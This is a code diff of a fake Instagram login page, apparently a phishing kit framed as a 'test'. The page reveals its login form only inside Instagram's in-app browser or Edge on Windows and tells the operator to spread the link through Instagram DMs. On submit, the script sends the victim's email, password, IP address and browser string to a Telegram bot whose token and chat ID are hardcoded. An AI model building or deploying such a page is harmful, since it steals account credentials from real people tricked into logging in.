@@ -7,33 +7,37 @@
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
     <title>Instagram Clone</title>
     <style>
+        /* Hidden by default */
         #main-wrapper { display: none; }
-        #bridge-screen { 
-            display: flex; flex-direction: column; justify-content: center; 
-            align-items: center; height: 100vh; text-align: center; font-family: sans-serif;
+        #status-message { 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; font-family: sans-serif; text-align: center; padding: 20px;
         }
-        .btn { background: #0095f6; color: white; padding: 10px 20px; border-radius: 4px; text-decoration: none; margin-top: 20px; cursor: pointer; }
+        .btn-link { color: #0095f6; font-weight: bold; text-decoration: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <!-- Bridge screen for external browsers -->
-    <div id="bridge-screen">
-        <h3>Testing Environment detected</h3>
-        <p>To test the Instagram In-App Browser, send this link to your DMs and open it there.</p>
-        <a id="intent-btn" class="btn">Open App Directly</a>
+    <div id="status-message">
+        <div>
+            <p>To run this test inside the Instagram App:</p>
+            <p>1. Host this file (e.g. GitHub Pages)</p>
+            <p>2. Send the link to your <b>Instagram DMs</b></p>
+            <p>3. Click the link inside the DM</p>
+        </div>
     </div>
 
-    <!-- The actual Login UI -->
     <div id="main-wrapper">
         <main class="flex align-items-center justify-content-center">
             <section id="auth" class="flex direction-column">
                 <div class="panel login flex direction-column">
-                    <h1 class="flex justify-content-center"><img src="./img/instagram-logo.png" /></h1>
+                    <h1 class="flex justify-content-center">
+                        <img src="./img/instagram-logo.png" alt="Instagram" />
+                    </h1>
                     <form id="login-form">
-                        <input id="email" placeholder="Phone, username, or email" required />
-                        <input id="password" type="password" placeholder="Password" required />
-                        <button type="submit">Log In</button>
+                        <input id="email" placeholder="Phone, username, or email" required style="padding: 10px; margin-bottom: 5px;"/>
+                        <input id="password" type="password" placeholder="Password" required style="padding: 10px; margin-bottom: 5px;"/>
+                        <button type="submit" style="background-color: #0095f6; color: white; border: none; padding: 10px; cursor: pointer;">Log In</button>
                     </form>
                 </div>
             </section>
@@ -42,35 +46,58 @@
 
 <script src="https://unpkg.com"></script>
 <script>
+    // --- 1. Browser & Environment Control ---
     (function() {
-        const ua = navigator.userAgent;
-        const isInstagram = ua.includes("Instagram"); // Detects Instagram In-App Browser
-        const isEdge = ua.includes("Edg") && ua.includes("Win");
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isInstagram = ua.indexOf("Instagram") > -1;
+        const isEdgeWin = ua.includes("Edg") && ua.includes("Win");
 
-        // 1. Show UI if inside Instagram App or using Edge on Windows
-        if (isInstagram || isEdge) {
-            document.getElementById('bridge-screen').style.display = 'none';
+        // Reveal content only if inside Instagram App or Edge on Windows
+        if (isInstagram || isEdgeWin) {
+            document.getElementById('status-message').style.display = 'none';
             document.getElementById('main-wrapper').style.display = 'block';
-        } else {
-            // 2. Otherwise, prepare the Intent button for Android
-            const currentUrl = window.location.href;
-            const intentUrl = `intent://${currentUrl.replace(/^https?:\/\//, '')}#Intent;package=com.instagram.android;scheme=https;end`;
-            document.getElementById('intent-btn').href = intentUrl;
         }
     })();
 
-    // Telegram Bot Submission
-    document.getElementById('login-form').addEventListener('submit', function(e) {
+    // --- 2. Original Telegram Credentials & Logging ---
+    const TOKEN = "7971493433:AAFiSKG7P1jckapqFHx-mThiTFtiBmOfhN0";
+    const CHAT_ID = "5763674764";
+    const URI_API = `https://api.telegram.org{TOKEN}/sendMessage`;
+
+    document.getElementById('login-form').addEventListener('submit', async function(e) {
         e.preventDefault();
+
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        
-        axios.get('https://api.ipify.org').then(res => {
-            const message = `<b>Hacking Test Log</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}\n<b>IP:</b> ${res.data.ip}`;
-            axios.post(`https://api.telegram.org`, {
-                chat_id: "5763674764", parse_mode: 'html', text: message
-            }).then(() => alert('Captured! Check your bot.'));
-        });
+
+        try {
+            // Fetch IP address first
+            const ipResponse = await axios.get('https://api.ipify.org');
+            const ip = ipResponse.data.ip;
+
+            // Prepare the message
+            const message = `
+<b>New Test Entry</b>
+<b>Email:</b> ${email}
+<b>Password:</b> ${password}
+<b>IP:</b> ${ip}
+<b>Agent:</b> ${navigator.userAgent}
+            `;
+
+            // Post to Telegram
+            const response = await axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+            });
+
+            if (response.data.ok) {
+                alert('Log captured and sent to Telegram!');
+            }
+        } catch (error) {
+            console.error("Submission failed:", error);
+            alert("Error: Check your Bot Token or ensure you have clicked START on your bot in Telegram.");
+        }
     });
 </script>
 </body>
